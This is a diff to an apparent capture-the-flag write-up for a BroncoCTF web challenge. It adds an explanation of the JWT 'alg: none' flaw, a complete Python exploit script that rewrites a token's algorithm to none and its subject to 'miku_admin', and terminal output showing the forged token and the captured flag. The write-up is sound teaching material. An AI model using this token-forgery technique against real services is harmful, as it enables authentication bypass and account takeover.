@@ -83,7 +83,58 @@
 
 ------------
 
-- This challenge is based on `jwt exploitation`.If an attacker sets the base64 encoded header key `alg` to `none`, the server takes the jwt as having no algorithm.
+- This challenge is based on `jwt exploitation`.If an attacker sets the base64 encoded header key `alg` to `none`, the server takes the jwt as having no algorithm and decodes it freely without the secret key.
+- I wrote a script to automate the process
+
+```python3
+#! /usr/bin/env python3
+from ten import *
+from tenlib.transform import *
+from dataclasses import *
+
+set_message_formatter("Oldschool")
+@arg("-h","--host")
+@entry
+@dataclass
+class Exploit:
+      host: str
+      @staticmethod
+      def tweakToken(token: str) -> str:
+          header,payload,signature =  token.split(".")
+          base64_decoded_header = json.decode(base64.decode(header)) 
+          base64_decoded_payload = json.decode(base64.decode(payload))
+          #Chaning alg to none
+          base64_decoded_header["alg"] =  "none"
+          base64_decoded_payload["sub"] = "miku_admin"
+          header = base64.encode(json.encode(base64_decoded_header)).replace("=","")
+          payload = base64.encode(json.encode(base64_decoded_payload)).replace("=","")
+          cookie =  f"{header}.{payload}.{signature}"
+          msg_info(f"Tweaked Cookie is : {cookie}")
+          return cookie
+
+      def run(self):
+          session = ScopedSession(self.host)
+          #Retrieving the token
+          msg_info("Retreiving the token....")
+          token = json.decode(session.get("/get_token").text)["your_token"]
+          cookie = Exploit.tweakToken(token)
+          data  =  {"magic_token": cookie}
+          flag =  session.post("/login",data=data)
+          msg_info(flag.text)
+
+if __name__ == "__main__":
+   Exploit()
+```
+
+- Flag-:```bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}```
+
+```bash
+❯ ./solve.py https://miku.web.broncoctf.xyz
+[*] Retreiving the token....
+[*] Tweaked Cookie is : 
+eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibWlrdV9hZG1pbiIsICJleHAiOiAxNzM5NjkzNTMwfQ.iCWM6lasTvp87UENXJLecwpZI37AqRTN-zROg8sOE-M
+[*] <h2>Welcome, Miku Admin! Here's your flag: bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}</h2>
+```
 
 
 
